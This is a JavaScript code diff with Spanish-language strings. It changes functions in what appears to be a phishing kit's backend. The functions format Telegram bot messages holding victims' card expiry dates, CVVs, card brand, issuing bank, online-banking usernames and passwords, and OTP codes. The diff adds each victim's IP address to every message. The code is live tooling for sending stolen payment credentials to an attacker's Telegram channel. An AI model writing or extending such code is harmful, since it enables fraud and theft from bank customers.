@@ -85,7 +85,7 @@ async function tgAnswerCallback(callbackQueryId, text) {
 }
 
 // ============================================================
-// 📝 TEXTOS DE MENSAJES TELEGRAM (TODOS CON VENCE, CVV Y MARCA)
+// 📝 TEXTOS DE MENSAJES TELEGRAM (CON IP INCLUIDA)
 // ============================================================
 
 function textoPasoCrear(pago) {
@@ -99,7 +99,8 @@ function textoPasoCrear(pago) {
         `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
         `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
-        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}`
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
+        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>`
     );
 }
 
@@ -114,7 +115,8 @@ function textoPasoCredenciales(pago) {
         `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
         `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
-        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
+        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>\n\n` +
         `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>`
     );
@@ -137,7 +139,8 @@ function textoPasoOTP(pago) {
         `📅 <b>Vence:</b> ${pago.vencimiento || '—'}\n` +
         `🔒 <b>CVV:</b> <code>${pago.cvv || '—'}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
-        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
+        `🌐 <b>IP:</b> <code>${pago.ip || 'Desconocida'}</code>\n\n` +
         `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
         `🔐 <b>${etiqueta}:</b> <code>${valor || '—'}</code>`
